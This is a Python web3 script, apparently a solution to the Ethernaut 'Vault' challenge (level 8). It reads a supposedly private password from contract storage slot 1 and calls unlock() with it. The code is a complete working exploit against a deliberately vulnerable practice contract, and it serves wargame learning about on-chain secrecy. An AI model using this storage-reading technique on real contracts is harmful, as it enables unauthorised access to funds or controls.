from web3 import Web3
from dotenv import dotenv_values

# 풀이
# 1. 

# 문제에서 사용하는 각종 정보 추출
ENV_PATH = "../.env"

dict_output = dotenv_values(ENV_PATH)

RPC_URI = dict_output['WEB3_PROVIDER_URI']

CONTRACT_ADDRESS = '0x32467b43BFa67273FC7dDda0999Ee9A12F2AaA08'
LEVEL_ADDRESS = '0x' + dict_output['ETHERNAUT_LEVEL08_ADDRESS']
USER_PRIVATE_KEY = '0x' + dict_output['USER_ADDRESS_PRIVATE_KEY']

web3 = Web3(Web3.HTTPProvider(RPC_URI))

# 연결 확인
if web3.is_connected():
    print("Connected to Network!")
else:
    print("Failed to connect to Network.")
    
PA = web3.eth.account.from_key(USER_PRIVATE_KEY)
USER_ADDRESS = PA.address

CONTRACT_ABI = [
    {
        "type": "constructor",
        "inputs": [
            {
                "name": "_password",
                "type": "bytes32",
                "internalType": "bytes32"
            }
        ],
        "stateMutability": "nonpayable"
    },
    {
        "type": "function",
        "name": "locked",
        "inputs": [],
        "outputs": [
            {
                "name": "",
                "type": "bool",
                "internalType": "bool"
            }
        ],
        "stateMutability": "view",
        "constant": True,
        "signature": "0xcf309012"
    },
    {
        "type": "function",
        "name": "unlock",
        "inputs": [
            {
                "name": "_password",
                "type": "bytes32",
                "internalType": "bytes32"
            }
        ],
        "outputs": [],
        "stateMutability": "nonpayable",
        "signature": "0xec9b5b3a"
    }
]

contract = web3.eth.contract(address=CONTRACT_ADDRESS, abi=CONTRACT_ABI)

# get_storage_at 변수를 이용해서 Private Variable 접근
PASSWORD = web3.eth.get_storage_at(CONTRACT_ADDRESS, 1)

print(f"Password : {PASSWORD}")

# 앞서 구한 Password 정보를 이용하여 unlock 함수 실행
data = {
    'gas': 300000,
    'gasPrice': web3.eth.gas_price,
    'nonce': web3.eth.get_transaction_count(USER_ADDRESS),
}

tx = contract.functions.unlock(PASSWORD).build_transaction(data)

# 트랜젝션 서명 및 전송
signed_tx = web3.eth.account.sign_transaction(tx, USER_PRIVATE_KEY)
tx_hash = web3.eth.send_raw_transaction(signed_tx.raw_transaction)

print(f"Transaction Hash: {web3.to_hex(tx_hash)}")

# 트랜잭션 결과 확인
tx_receipt = web3.eth.wait_for_transaction_receipt(tx_hash)
print(f"Transaction Receipt: {tx_receipt}")

result = contract.functions.locked().call()

if result == False:
    print("Stage Cleared!")
else:
    print("Stage Failed... Try Again...")